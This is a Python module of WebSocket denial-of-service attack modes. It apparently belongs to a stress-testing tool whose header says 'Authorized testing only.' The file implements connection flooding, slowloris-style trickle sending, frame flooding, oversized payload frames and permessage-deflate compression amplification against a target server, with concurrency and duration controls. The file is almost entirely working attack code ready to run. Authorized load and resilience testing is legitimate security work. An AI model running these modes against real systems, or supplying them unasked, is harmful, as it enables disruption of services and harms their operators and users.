"""Stress / DoS-class attack modes. Authorized testing only."""

from __future__ import annotations

import asyncio
import random
import string
import sys
from contextlib import suppress
from typing import Optional

import websockets
from websockets.exceptions import (
    ConnectionClosed,
    InvalidHandshake,
    InvalidStatusCode,
)

from .common import (
    METRICS,
    STOPPING,
    build_ssl_context,
    normalize_target,
    parse_headers,
)


async def _open_one(url: str, ssl_ctx, headers, timeout: float, compression=None):
    METRICS.connections_attempted += 1
    try:
        ws = await websockets.connect(
            url,
            ssl=ssl_ctx if url.startswith("wss://") else None,
            extra_headers=list(headers.items()) if headers else None,
            open_timeout=timeout,
            close_timeout=1,
            ping_interval=None,
            max_size=None,
            compression=compression,
        )
        METRICS.conn_opened()
        return ws
    except (InvalidStatusCode, InvalidHandshake):
        METRICS.handshake_rejects += 1
        return None
    except Exception as exc:  # noqa: BLE001
        METRICS.connections_failed += 1
        METRICS.record_error(exc)
        return None


async def _run_with_duration(tasks, duration: float) -> None:
    if duration > 0:
        async def stopper():
            await asyncio.sleep(duration)
            STOPPING.set()
        tasks.append(asyncio.create_task(stopper()))
    await asyncio.gather(*tasks, return_exceptions=True)


async def mode_flood(args) -> None:
    url = normalize_target(args.target, args.port, args.path, args.tls)
    ssl_ctx = build_ssl_context(args.insecure)
    headers = parse_headers(args.header)
    sem = asyncio.Semaphore(args.concurrency)
    holders = []

    async def worker():
        async with sem:
            ws = await _open_one(url, ssl_ctx, headers, args.timeout)
            if ws is None:
                return
            holders.append(ws)
            try:
                await STOPPING.wait()
            finally:
                with suppress(Exception):
                    await ws.close()
                METRICS.conn_closed()

    tasks = [asyncio.create_task(worker()) for _ in range(args.count)]
    await _run_with_duration(tasks, args.duration)


async def mode_slowloris(args) -> None:
    url = normalize_target(args.target, args.port, args.path, args.tls)
    ssl_ctx = build_ssl_context(args.insecure)
    headers = parse_headers(args.header)

    async def worker():
        ws = await _open_one(url, ssl_ctx, headers, args.timeout)
        if ws is None:
            return
        try:
            while not STOPPING.is_set():
                payload = random.choice(string.ascii_lowercase)
                try:
                    await ws.send(payload)
                    METRICS.frames_sent += 1
                    METRICS.bytes_sent += 1
                except ConnectionClosed:
                    return
                except Exception as exc:  # noqa: BLE001
                    METRICS.record_error(exc)
                    return
                await asyncio.sleep(args.interval)
        finally:
            with suppress(Exception):
                await ws.close()
            METRICS.conn_closed()

    tasks = [asyncio.create_task(worker()) for _ in range(args.count)]
    await _run_with_duration(tasks, args.duration)


async def mode_frame_flood(args) -> None:
    url = normalize_target(args.target, args.port, args.path, args.tls)
    ssl_ctx = build_ssl_context(args.insecure)
    headers = parse_headers(args.header)
    payload = "".join(random.choices(string.printable, k=args.payload_size))

    async def worker():
        ws = await _open_one(url, ssl_ctx, headers, args.timeout)
        if ws is None:
            return
        try:
            while not STOPPING.is_set():
                try:
                    await ws.send(payload)
                    METRICS.frames_sent += 1
                    METRICS.bytes_sent += len(payload)
                except ConnectionClosed:
                    return
                except Exception as exc:  # noqa: BLE001
                    METRICS.record_error(exc)
                    return
        finally:
            with suppress(Exception):
                await ws.close()
            METRICS.conn_closed()

    tasks = [asyncio.create_task(worker()) for _ in range(args.workers)]
    await _run_with_duration(tasks, args.duration)


async def mode_payload(args) -> None:
    url = normalize_target(args.target, args.port, args.path, args.tls)
    ssl_ctx = build_ssl_context(args.insecure)
    headers = parse_headers(args.header)
    payload = "A" * args.payload_size

    async def worker():
        ws = await _open_one(url, ssl_ctx, headers, args.timeout)
        if ws is None:
            return
        try:
            count = 0
            while not STOPPING.is_set() and (args.frames == 0 or count < args.frames):
                try:
                    await ws.send(payload)
                    METRICS.frames_sent += 1
                    METRICS.bytes_sent += len(payload)
                    count += 1
                except ConnectionClosed:
                    return
                except Exception as exc:  # noqa: BLE001
                    METRICS.record_error(exc)
                    return
                await asyncio.sleep(args.interval)
        finally:
            with suppress(Exception):
                await ws.close()
            METRICS.conn_closed()

    tasks = [asyncio.create_task(worker()) for _ in range(args.workers)]
    await _run_with_duration(tasks, args.duration)


async def mode_compression(args) -> None:
    """permessage-deflate amplification."""
    url = normalize_target(args.target, args.port, args.path, args.tls)
    ssl_ctx = build_ssl_context(args.insecure)
    headers = parse_headers(args.header)
    payload = "A" * args.payload_size

    async def worker():
        ws = await _open_one(url, ssl_ctx, headers, args.timeout, compression="deflate")
        if ws is None:
            return
        try:
            while not STOPPING.is_set():
                try:
                    await ws.send(payload)
                    METRICS.frames_sent += 1
                    METRICS.bytes_sent += len(payload)
                except ConnectionClosed:
                    return
                except Exception as exc:  # noqa: BLE001
                    METRICS.record_error(exc)
                    return
        finally:
            with suppress(Exception):
                await ws.close()
            METRICS.conn_closed()

    tasks = [asyncio.create_task(worker()) for _ in range(args.workers)]
    await _run_with_duration(tasks, args.duration)
